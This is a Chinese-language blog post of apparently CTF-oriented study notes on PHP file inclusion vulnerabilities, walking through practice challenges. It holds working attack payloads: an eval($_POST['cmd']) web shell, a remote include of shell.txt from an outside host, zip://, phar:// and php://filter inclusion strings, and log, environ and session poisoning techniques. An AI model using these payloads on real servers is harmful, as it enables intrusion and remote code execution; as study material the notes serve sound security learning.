<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>文件包含 | 人间且慢行</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><meta name="referrer" content="no-referrer-when-downgrade"><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">文件包含</h1><a id="logo" href="/.">人间且慢行</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">文件包含</h1><div class="post-meta">Sep 20, 2019<span> | </span><span class="category"><a href="/categories/安全/">安全</a></span><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关函数（php）"><span class="toc-number">1.2.</span> <span class="toc-text">相关函数（php）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类"><span class="toc-number">1.3.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#包含的实现"><span class="toc-number">1.4.</span> <span class="toc-text">包含的实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#包含的场景"><span class="toc-number">1.5.</span> <span class="toc-text">包含的场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#上传图片"><span class="toc-number">1.5.1.</span> <span class="toc-text">上传图片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体场景——远程文件包含"><span class="toc-number">1.5.2.</span> <span class="toc-text">具体场景——远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪协议"><span class="toc-number">1.5.3.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Phar：类似打包（java中的打jar包）"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">Phar：类似打包（java中的打jar包）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">php//filter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.5.4.</span> <span class="toc-text">php://input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志文件"><span class="toc-number">1.5.5.</span> <span class="toc-text">日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统环境"><span class="toc-number">1.5.6.</span> <span class="toc-text">系统环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session"><span class="toc-number">1.5.7.</span> <span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习：ichunqiu-netbook"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">练习：ichunqiu netbook</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远古魔法"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">远古魔法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP自包含"><span class="toc-number">1.5.8.</span> <span class="toc-text">PHP自包含</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>文件包含</strong></p>
<ul>
<li>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种调用过程称文件包含</li>
</ul>
<p><strong>文件包含漏洞</strong></p>
<ul>
<li>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</li>
<li><h2 id="相关函数（php）"><a href="#相关函数（php）" class="headerlink" title="相关函数（php）"></a>相关函数（php）</h2></li>
<li>include（）</li>
<li>include_once()（加once，只包含一次，下次再出现不执行）</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>远程文件包含<ul>
<li>例如js文件调用网页上的库</li>
</ul>
</li>
<li>本地文件包含</li>
</ul>
<h2 id="包含的实现"><a href="#包含的实现" class="headerlink" title="包含的实现"></a>包含的实现</h2><p>包含的时候，不一定是要去包含php文件（即非可执行的php文件）</p>
<p>类似于a.php,a.xxx,a.jpg<br>只要里面包含一块完整php代码，例如一个a.txt,内容为<code>&lt;?php phpinfo();?&gt;</code></p>
<h2 id="包含的场景"><a href="#包含的场景" class="headerlink" title="包含的场景"></a>包含的场景</h2><p>由于被包含的文件类型多种多样，因此在实现的时候，中鼎在于找到可控文件</p>
<ul>
<li>比如说我们能够上传图片，那就去传一个完整的php代码的图片文件，或者是将代码文件后缀即可</li>
<li>压缩包，建议配伪协议</li>
</ul>
<h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><p><a href="http://123.206.31.85:49166" target="_blank" rel="noopener">练习：SK CTF</a><br>当包含的是无法解析的文件时会变成读文件，读取etc/passwd<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/DkysCw6Xjj.png" alt="1"></p>
<p>查看源代码发现注释有提示：<code>&lt;!-- upload.php --&gt;</code><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/zGBBnyRzAH.png" alt="2"><br>可以进行文件上传，上传一个phpinfo()的png后缀文件，进行文件包含</p>
<p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/jxchxzR8ba.png" alt="3"></p>
<p>返回<code>_
phpinfo();
_</code>,<code>&lt;?php ?&gt;</code>不见了,猜测做了过滤替换<br>上传这种php格式(菜刀连接后门的话密码是cmd)<br><code>&lt;script language=php&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></p>
<p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/xP5a4frSFz.png" alt="4"></p>
<h3 id="具体场景——远程文件包含"><a href="#具体场景——远程文件包含" class="headerlink" title="具体场景——远程文件包含"></a>具体场景——远程文件包含</h3><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/RN3Ywf2CZW.png" alt="5"><br>远程包含文件<br><code>[http|https|ftp]://www.bbb.com/shell.txt</code></p>
<p>若后缀名写死，可以用问号绕过，在url中？后面跟参数</p>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/aX5he7ABWy.png" alt="6"><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/hneH3SnXDY.png" alt="9"></p>
<ul>
<li>PHP归档</li>
<li>Phar://</li>
<li>Zip://<br><a href="http://106.12.37.37:10007/" target="_blank" rel="noopener">练习</a><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/P48XA2xaes.png" alt="7"><br>看url结构，猜测是包含了一个上传upload.php，但在实际包含的时候会默认加一个php后缀例如，要包含的是a.jpg,但它会变成a.jpg.php，就会出现文件不存在的情况</li>
</ul>
<p>这时候需要用到Zip，里面放一个phpinfo.php<br>重新上传包含，注意%23=#存在编码问题<br><code>?url=zip://upload/fddf1f39a58111b2d7f26f542379be79.zip%23phpinfo</code><br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/fe5b5eZ5tf.png" alt="8">（可以换成后门）</p>
<h4 id="Phar：类似打包（java中的打jar包）"><a href="#Phar：类似打包（java中的打jar包）" class="headerlink" title="Phar：类似打包（java中的打jar包）"></a>Phar：类似打包（java中的打jar包）</h4><p>如果不能用#，就只能用phar协议改为下面这个，会发现也是可以执行的<br><code>?url=phar://upload/fddf1f39a58111b2d7f26f542379be79.zip/phpinfo</code></p>
<p>如果不能上传zip文件，则可以把zip文件改成可以上传的后缀，发现也是可以的，<strong>它本质上还是一个压缩包文件</strong></p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php//filter"></a>php//filter</h4><p>利用php流</p>
<p>php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似readfile()、类似readfile()、file()和file get contents(),在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>php://filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p>
<p><code>?file=php://filter/convert.base64-encode（转码为base64）/resource=index.php（来源）</code></p>
<p><a href="http://chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">练习：南邮</a></p>
<p>点击超链接，可以看到url中存在文件包含，使用filter协议</p>
<p>如图10：获得index。php的base64转码，接下来解码<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/crKZASyZbz.png" alt="10"></p>
<p>使用bp的decoder模块进行转码得到flag</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/bPRi44hTXY.png" alt="11"></p>
<h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log,当发生错误时将错误写入error.log。默认情况下，日志路径在/var/log/apache2/</p>
<p>特定场景下可以读取日志时,可以构造错误日志，进行文件包含。</p>
<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><p>linux（FreeBSD是没有这个的）下的/proc/self/environ</p>
<p>要求是php运行在cgi上面，然后和包含日志一样，在User-agent修改成payload</p>
<p>Exploiting LFI to RCE /proc/self/environ with burpsuite:<br><a href="https://www.youtube.com/watch?v=dlh0ogYy9ys" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dlh0ogYy9ys</a></p>
<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><ul>
<li><p>php默认生成的Session文件往往存放在/tmp目录下<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190922/X2M5ehC2iY.png" alt="13"></p>
</li>
<li><p>session是在服务器端的，所以肯定有文件是记录session的<br>例子：<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190918/dSwEZefCyy.png" alt="12"><br>session——start官方手册上给的第一个例子，对session变量进行了赋值，如果我们访问了这个页面，就会触发session_start,session的位置可以在phpinfo中找到</p>
</li>
<li><p>session.upload_progress.enabled这个参数在php.ini默认开启，需要手动设置为off，如果不是off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo中获取到</p>
</li>
<li><p>/var/lib/php5/sess_{your_php_session_id}</p>
</li>
</ul>
<h4 id="练习：ichunqiu-netbook"><a href="#练习：ichunqiu-netbook" class="headerlink" title="练习：ichunqiu netbook"></a>练习：ichunqiu <a href="https://www.ichunqiu.com/battalion?t=1&r=56951" target="_blank" rel="noopener">netbook</a></h4><p>扫后台会发现robots.txt文件<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190922/znbPwh8Syx.png" alt="14"><br>看到提示，找到phpinfo</p>
<p>思路：文件读取试一下，?file=php://filter/convert.base64-encode/resource=index.php，发现不行，查看session，如果session文件中内容可控，就可以包含<br><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190922/tGtDhkNBQ5.png" alt="15"><br>可以注册一个带关键字的账号<?php phpinfo();?>,找到session，现在需要知道session文件的位置（phpinfo中看）和文件名（sess_yoursession），再进行文件包含</p>
<h4 id="远古魔法"><a href="#远古魔法" class="headerlink" title="远古魔法"></a>远古魔法</h4><p><img src="http://yuntu88.oss-cn-beijing.aliyuncs.com/fromlocal/2896251617@qq.com/20190922/mAMRBEpGnJ.png" alt="16"></p>
<h3 id="PHP自包含"><a href="#PHP自包含" class="headerlink" title="PHP自包含"></a>PHP自包含</h3><p>/a.php?include=a.php<br>这样a.php会将它本身包含进来，而被包含进来的a.php再次尝试处理url的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆站，使得php无法进行此次请求的后续处理，然后就能进行包含了</p>
<p>上传会产生临时文件，会话结束，临时文件删除，使用自包含（导致php停止）的话可以使删除临时文件的操作不去执行。</p>
<p>需要有包含点，且能实现路径可控的。</p>
</div><div class="tags"><a href="/tags/web安全-ctf/">web安全 ctf</a></div><div class="post-nav"><a class="pre" href="/2019/10/04/3.代码执行与命令执行/">代码执行与命令执行</a><a class="next" href="/2019/09/15/1.文件上传/">文件上传</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/信安之路/">信安之路</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/基础知识/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书/">读书</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/转载/">转载</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/web安全-ctf/" style="font-size: 15px;">web安全 ctf</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/计算机网络/" style="font-size: 15px;">计算机网络</a> <a href="/tags/博客搭建/" style="font-size: 15px;">博客搭建</a> <a href="/tags/基础/" style="font-size: 15px;">基础</a> <a href="/tags/数据结构/" style="font-size: 15px;">数据结构</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/06/六、Web页面解析的流程学习/">六、Web页面解析的流程学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/04/3.代码执行与命令执行/">代码执行与命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/20/2.文件包含/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/15/1.文件上传/">文件上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/14/desc相关例题/">desc相关注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/13/order by/">order by，insert相关注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/12/bool型盲注/">bool型盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/基于时间盲注的部分相关函数/">基于时间盲注的部分相关函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/约束条件的安全测试——报错注入/">约束条件的安全测试_报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/05/宽字节注入/">宽字节注入</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a><ul></ul><a target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">人间且慢行.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="0,0,0" opacity="0.5" zindex="-2" count="50" src="//lib.baomitu.com/canvas-nest.js/2.0.4/canvas-nest.umd.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>